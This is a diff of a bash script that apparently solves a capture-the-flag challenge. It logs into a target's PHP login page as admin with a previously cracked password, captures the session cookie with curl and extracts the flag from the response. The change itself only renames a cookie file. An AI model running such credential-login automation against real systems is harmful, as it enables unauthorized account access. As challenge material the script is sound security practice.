@@ -39,12 +39,12 @@ echo "--> Password cracked : $PASSWORD"
 
 # Initiate php session
 echo "5 - AUTHENTICATE ON WEBSITE"
-curl -s -X GET "http://$target_ip:81/login.php" -c "/work/2-cookie-cf.txt" -L > /dev/null
-PHPSESSID=$(grep PHPSESSID "/work/2-cookie-cf.txt" | awk '{print $7}')
+curl -s -X GET "http://$target_ip:81/login.php" -c "/work/2-cookies.txt" -L > /dev/null
+PHPSESSID=$(grep PHPSESSID "/work/2-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated : $PHPSESSID"
 
 # Authenticate
-curl -s -X POST "http://$target_ip:81/login.php" -b /work/2-cookie-cf.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/2-cf-flag.html
+curl -s -X POST "http://$target_ip:81/login.php" -b /work/2-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/2-cf-flag.html
 echo "--> Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/2-cf-flag.html)"
 
-rm -f /work/2-cookie-cf.txt
+rm -f /work/2-cookies.txt
